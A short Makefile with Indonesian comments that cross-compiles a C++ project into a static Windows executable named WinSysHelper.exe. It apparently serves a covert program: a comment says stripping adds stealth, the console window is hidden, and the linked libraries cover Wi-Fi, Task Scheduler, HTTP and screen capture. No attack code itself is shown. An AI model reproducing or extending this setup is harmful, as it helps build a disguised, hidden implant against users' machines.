# Pengaturan Compiler untuk Cross-Compile ke Windows
CXX = x86_64-w64-mingw32-g++

# CXXFLAGS ditingkatkan:
# -std=c++17: Wajib untuk filesystem
# -s: Strip symbols (mengecilkan ukuran & menambah stealth)
# -ffunction-sections -fdata-sections: Membantu linker menghapus code yang tidak terpakai
CXXFLAGS = -O3 -std=c++17 -static -mwindows -s -I. -DUNICODE -D_UNICODE -ffunction-sections -fdata-sections

# Library Windows - Urutan sangat penting (Library yang dependen diletakkan lebih awal)
LIBS = -lwininet -lwinhttp -lwlanapi -lgdiplus -lgdi32 -ltaskschd -lole32 -loleaut32 -luuid -ladvapi32 -lshell32 -lrpcrt4 -lws2_32 -lstdc++fs

# Linker flags untuk membuang unused code agar file makin ramping
LDFLAGS = -static -static-libgcc -static-libstdc++ -Wl,--gc-sections

# Daftar File Sumber
SRCS = main.cpp $(wildcard core/*.cpp)
OBJS = $(SRCS:.cpp=.o)

# Nama Output
TARGET = WinSysHelper.exe

# Aturan Utama
all: $(TARGET)

$(TARGET): $(OBJS)
	$(CXX) $(CXXFLAGS) $(OBJS) -o $(TARGET) $(LDFLAGS) $(LIBS)

# Aturan kompilasi file individu menjadi object file
%.o: %.cpp
	$(CXX) $(CXXFLAGS) -c $< -o $@
 
# Aturan untuk membersihkan file hasil build
clean:
	rm -f $(OBJS) $(TARGET)

.PHONY: all clean